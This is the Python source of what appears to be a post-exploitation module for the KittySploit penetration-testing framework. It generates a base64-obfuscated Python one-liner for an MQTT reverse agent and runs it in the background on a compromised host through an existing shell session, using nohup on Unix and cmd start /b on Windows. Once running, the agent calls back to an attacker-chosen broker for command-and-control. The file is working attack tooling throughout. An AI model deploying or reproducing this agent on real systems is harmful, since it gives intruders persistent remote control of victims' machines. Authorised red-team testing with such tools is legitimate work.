#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Post module: package/show MQTT reverse agent for delivery from a shell session."""

from kittysploit import *
from lib.c2.mqtt_reverse_agent import build_mqtt_reverse_agent_script
from lib.post.windows.session import win_compat_failure_type
from core.framework.failure import ProcedureError
import base64
import uuid


class Module(Post):
    __info__ = {
        "name": "Deploy MQTT Reverse Agent",
        "description": (
            "Generate and optionally execute a stdlib Python MQTT reverse agent "
            "from an existing shell session. Pairs with listeners/iot/reverse_mqtt_shell."
        ),
        "author": "KittySploit Team",
        "platform": Platform.MULTI,
        "session_type": [SessionType.SHELL, SessionType.METERPRETER],
        "tags": ["iot", "mqtt", "c2", "manage"],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 2,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
            "chain": {
                "produces_capabilities": ["shell", "mqtt_access"],
                "consumes_capabilities": ["shell"],
                "suggested_followups": ["listeners/iot/reverse_mqtt_shell"],
            },
        },
    }

    broker_host = OptString("127.0.0.1", "MQTT broker host reachable from the target", True)
    broker_port = OptPort(1883, "MQTT broker port", True)
    base_topic = OptString("kittysploit/c2", "Base topic (must match reverse_mqtt_shell)", False)
    client_id = OptString("", "Agent client ID (auto if empty)", False)
    username = OptString("", "Broker username", False)
    password = OptString("", "Broker password", False)
    python_binary = OptString("python3", "Python binary on target (try python if needed)", False)
    execute = OptBool(True, "Execute the agent on the current session (background)", False)
    show_command = OptBool(True, "Print the one-liner", False)

    def check(self):
        sid = getattr(self, "session_id", "")
        if hasattr(sid, "value"):
            sid = sid.value
        if not str(sid or "").strip():
            print_error("session_id is required")
            return False
        if not str(self.broker_host or "").strip():
            print_error("broker_host is required")
            return False
        return True

    def _build_oneliner(self, cid: str) -> str:
        script = build_mqtt_reverse_agent_script(
            str(self.broker_host),
            int(self.broker_port),
            cid,
            base_topic=str(self.base_topic or "kittysploit/c2"),
            username=str(self.username or ""),
            password=str(self.password or ""),
        )
        encoded = base64.b64encode(script.encode("utf-8")).decode("ascii")
        py = str(self.python_binary or "python3").strip() or "python3"
        return f'{py} -c "import base64;exec(base64.b64decode(\'{encoded}\').decode())"'

    def run(self):
        if not self.check():
            raise ProcedureError(win_compat_failure_type(), "MQTT agent deploy prerequisites not met")

        cid = str(self.client_id or "").strip() or f"mqtt-{uuid.uuid4().hex[:8]}"
        oneliner = self._build_oneliner(cid)

        print_status(f"MQTT reverse agent client_id={cid}")
        print_info(
            f"Ensure listeners/iot/reverse_mqtt_shell is running on broker "
            f"{self.broker_host}:{self.broker_port} base_topic={self.base_topic}"
        )

        if bool(self.show_command):
            print_info("One-liner:")
            print_info(oneliner)

        if not bool(self.execute):
            print_success("Agent command generated (execute=false)")
            return True

        # Background where possible
        bg = oneliner
        # Detect rough OS from a quick probe
        probe = (self.cmd_execute("echo %OS% 2>nul || uname 2>/dev/null") or "").lower()
        if "windows_nt" in probe or "microsoft" in probe:
            escaped = oneliner.replace('"', '\\"')
            bg = f'cmd /c start /b "" cmd /c "{escaped}"'
        else:
            bg = f"nohup {oneliner} >/dev/null 2>&1 &"

        print_status("Dispatching MQTT reverse agent on current session...")
        try:
            self.cmd_execute(bg)
        except Exception as exc:
            print_warning(f"Dispatch reported: {exc}")

        print_success("Agent dispatched — wait for reverse_mqtt_shell session")
        print_info(f"Expected agent id: {cid}")
        return True
